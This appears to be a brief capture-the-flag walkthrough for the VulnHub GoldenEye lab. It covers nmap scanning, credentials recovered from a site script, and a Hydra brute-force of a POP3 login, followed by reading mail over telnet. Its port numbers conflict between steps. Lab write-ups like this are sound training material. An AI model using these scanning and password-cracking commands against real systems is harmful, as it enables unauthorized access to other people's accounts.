# VulnHub Walkthrough: 👁️‍🗨️ 007 Golden Eye

1. Initial scan:
     * `netdiscover -r <Kali IP>`
     * `nmap -p0-65535 <007 IP>`
     * Open ports: *SSH* & *HTTP*

2. On your Kali machine, map Golden Eye's IP to a domain to make things easier:
     * `nano /etc/hosts` then add the following line `<007 IP> golden.eye`

3. Next look through `http://golden.eye`:
     * At *http://golden.eye/terminal.js*, we find users: *Boris* & *Natalya*
     * Decrypt using burpsuite/terminal/online - User: *Boris* | Password: *InvincibleHack3r*

4. Enter username & password @ *http://golden.eye/sev-home*

5. Check scan again (not really necessary):
     * `nmap -p0-65535 -A golden.eye`

6. Telnet:
     * Try `telnet golden.eye 55007` --> Try `USER boris`. But we don't know the password so just quit connection :/

7. Let's try using Hydra to crack the password:
     * `hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f golden.eye -s 5507 pop3`
     * User: *boris* | Password: *secret1!*

8. We can now login using into telnet:
     * `telnet golden.eye 5507`
     * `USER boris` --> `PASS secret1!`
     * `LIST`
     * `RETR<1-3>`: you get a new user: *Xenia*
